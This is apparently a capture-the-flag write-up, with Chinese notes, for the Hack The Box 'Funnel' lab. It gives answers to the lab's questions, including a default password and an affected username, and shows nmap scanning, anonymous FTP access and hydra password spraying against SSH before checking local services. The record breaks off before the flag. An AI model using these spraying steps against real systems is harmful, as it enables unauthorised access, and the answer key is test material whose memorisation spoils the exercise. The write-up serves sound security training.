<center>Funnel</center>



[toc]







## Funnel

> Funnel







### 1. task

1. How many TCP ports are open?

```shell
2
```

2. What is the name of the directory that is available on the FTP server?

```shell
mail_backup
```

3. What is the default account password that every new member on the "Funnel" team should change as soon as possible?

```shell
funnel123#!#
```

4. Which user has not changed their default password yet?

```shell
christine
```

5. Which service is running on TCP port 5432 and listens only on localhost?

```shell
postgresql
```

6. Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?

```shell
local port forwarding
```

7. What is the name of the database that holds the flag?

```shell
secrets
```

8. Could you use a dynamic tunnel instead of local port forwarding? Yes or No.

```shell
yes
```







### 3. flag

>  获取flag

```shell
nmap -sC -sV IP
```

![image-20241202112103426](./assets/image-20241202112103426.png)

> ftp 匿名登陆

```shell
ftp IP
用户名： anonymous/空密码
```

> 下载ftp文件

![image-20241202112544598](./assets/image-20241202112544598.png)

```shell
cat welcome_28112022

optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb

cat password_policy.pdf

发现一个默认密码：funnel123#!#
```

> 对ssh和密码爆破

```shell
hydra -L user.txt -p "funnel123#!#" ssh://IP
```

> 登陆ssh

```shell
# 检查哪些端口在给定的机器上执行本地监听
ss -tln

# 检查在端口上运行的默认服务 为postgresql
ss -tl
```

> 确认有 postgresql 服务

```shell
# 检查并没有安装了postgresql客户端工具
psql

# 并且不能进行下载，需要root权限
apt install postgresql-client-common
```



